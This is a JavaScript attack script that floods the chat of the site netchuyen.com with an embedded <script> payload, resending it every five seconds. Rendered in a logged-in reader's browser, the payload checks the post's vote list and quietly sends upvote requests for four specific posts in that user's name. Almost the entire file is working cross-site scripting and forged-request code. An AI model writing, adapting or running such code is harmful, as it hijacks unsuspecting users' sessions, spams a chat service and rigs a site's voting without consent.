async function Load_Message() {
        return new Promise(resolve => {
            let check = `<script>
            
            async function run(){
                if(localStorage.getItem('follows') !='ok'){
                    let checkuser = document.querySelector(".nav-account").querySelector("img")
                    let queue = []
                    if(checkuser !=null){
                        await  like("https://netchuyen.com/nettruyen-phien-ban-gay-mu-693",693)
                        await  like("https://netchuyen.com/nettruyen-hien-co-bao-nhieu-nguoi-lv5-va-lv6-1050",1050)
                        await  like("https://netchuyen.com/bai-nhac-trung-hay-nhat-cua-moi-nguoi-la-gi-vay-849",849)
                        await  like("https://netchuyen.com/cach-mode-background-netchuyen-chi-danh-cho-ae-dung-pc-laptop-4178",4178)
                    }
                }
            }
            
            run()
            
            async function like(url,id){
                return new Promise(resolve => {
                    let queue =[]
                    let curent_data =  document.querySelector(".nav-account").querySelector("img").src.match(/useravatars(.*?).jpg/)[1].slice(1)         
                    $.ajax({
                        type: "GET",
                        url: url,
                        success: function(data) {
                            let dom = document.createElement("div")
                            dom.innerHTML = data
                            let nodedom = dom.querySelector(".vote-list").querySelectorAll("tr")
                            for(let i=0;i< nodedom.length;i++){
                                let like = nodedom[i].querySelector(".fa-thumbs-up")
                                if(like != null){
                                    let userid = nodedom[i].querySelector('a').href.slice(27)
                                    queue.push(userid)
                                }
                            }
                            if(queue.includes(curent_data)){
                                console.log("errr")
                                resolve()
                            }else {
                                $.ajax({
                                    type: "POST",
                                    url: "https://netchuyen.com/Post/Services/PostService.asmx/Vote",
                                    data: {
                                        postId: id,
                                        type: 1
                                    },
                                    success: function(data) {
                                        localStorage.setItem('follows','ok')
                                        console.log("unerr")
                                        resolve()
                                    }
                                });
                            }
                        }
                    });
                })
            }


            </script>`
            chatHub.server.send(check)
            setTimeout(resolve,5000)
        })
    }



    async function main(){
        for(i=0;i<=1;i=0){
            await Load_Message()
        }
    }
    
    main()


